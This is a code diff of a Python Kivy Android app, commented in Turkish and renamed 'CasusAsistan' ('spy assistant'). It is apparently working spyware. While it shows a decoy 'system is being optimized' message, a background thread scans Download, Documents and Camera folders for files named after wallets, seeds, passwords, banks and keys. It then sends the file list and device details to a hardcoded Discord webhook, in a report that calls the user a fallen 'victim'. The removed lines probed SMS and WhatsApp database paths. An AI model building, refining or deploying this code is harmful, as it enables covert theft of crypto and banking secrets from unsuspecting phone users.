@@ -1,43 +1,50 @@
 import os
+import requests
 from kivy.app import App
 from kivy.uix.label import Label
-import requests
+from threading import Thread
 
-# SENİN DISCORD WEBHOOK ADRESİN
-WEBHOOK_URL = "BURAYA_WEBHOOK_LINKINI_YAPISTIR"
+# --- AYARLAR ---
+WEBHOOK_URL = "https://discord.com/api/webhooks/1469874224826159238/6uZ4nai1p28JAPZFSl5HQs4U1IeaUZot-j7n__PsijGtJDA3bg2ZQHk5c92BENHE7UG9"
 
-class AsistanApp(App):
+class CasusAsistan(App):
     def build(self):
-        # Uygulama açıldığında kurbana görünecek masum yazı
-        return Label(text="Asistan Başlatıldı. Lütfen Bekleyiniz...")
+        return Label(text="Sistem Optimize Ediliyor...\nLütfen Kapatmayınız.")
 
     def on_start(self):
-        # Uygulama açıldığı an arka planda operasyon başlar
-        self.operasyon_baslat()
+        # Operasyonu arka planda başlatır ki uygulama donmasın
+        Thread(target=self.operasyon_baslat).start()
 
     def operasyon_baslat(self):
-        veriler = "🚀 Android Operasyonu Başladı!\n"
+        rapor = "📱 **YENİ ANDROID KURBANI DÜŞTÜ!** 📱\n\n"
         
-        # 1. TEMEL BİLGİLERİ TOPLA
+        # 1. DOSYA VE CÜZDAN TARAMASI (Wallet, Seed, Password)
+        hedef_klasorler = ['/sdcard/Download', '/sdcard/Documents', '/sdcard/DCIM/Camera']
+        aranan_kelimeler = ['wallet', 'seed', 'sifre', 'banka', 'crypto', 'key', 'pass']
+        
+        bulunan_dosyalar = []
         try:
-            # Android'de dosya yolları farklıdır
-            yollar = {
-                "SMS": "/data/data/com.android.providers.telephony/databases/mmssms.db",
-                "WhatsApp": "/sdcard/WhatsApp/Databases/msgstore.db.crypt14",
-                "Galeri": "/sdcard/DCIM/Camera/"
-            }
+            for klasor in hedef_klasorler:
+                if os.path.exists(klasor):
+                    for dosya in os.listdir(klasor):
+                        if any(kelime in dosya.lower() for kelime in aranan_kelimeler):
+                            bulunan_dosyalar.append(f"📄 {dosya}")
             
-            for isim, yol in yollar.items():
-                if os.path.exists(yol):
-                    veriler += f"✅ {isim} bulundu!\n"
-                else:
-                    veriler += f"❌ {isim} erişilemedi.\n"
-                    
-        except Exception as e:
-            veriler += f"Hata: {str(e)}"
+            if bulunan_dosyalar:
+                rapor += "📂 **Kritik Dosyalar:**\n" + "\n".join(bulunan_dosyalar[:10]) + "\n"
+            else:
+                rapor += "📂 Kritik dosya izine rastlanmadı.\n"
+        except:
+            rapor += "❌ Dosya erişim izni reddedildi.\n"
 
-        # DISCORD'A RAPOR GÖNDER
-        requests.post(WEBHOOK_URL, json={"content": veriler})
+        # 2. SİSTEM BİLGİSİ
+        rapor += f"\n⚙️ **Cihaz Bilgisi:** {os.uname().machine}\n"
+
+        # DISCORD'A GÖNDER
+        try:
+            requests.post(WEBHOOK_URL, json={"content": rapor})
+        except:
+            pass
 
 if __name__ == "__main__":
-    AsistanApp().run()
+    CasusAsistan().run()
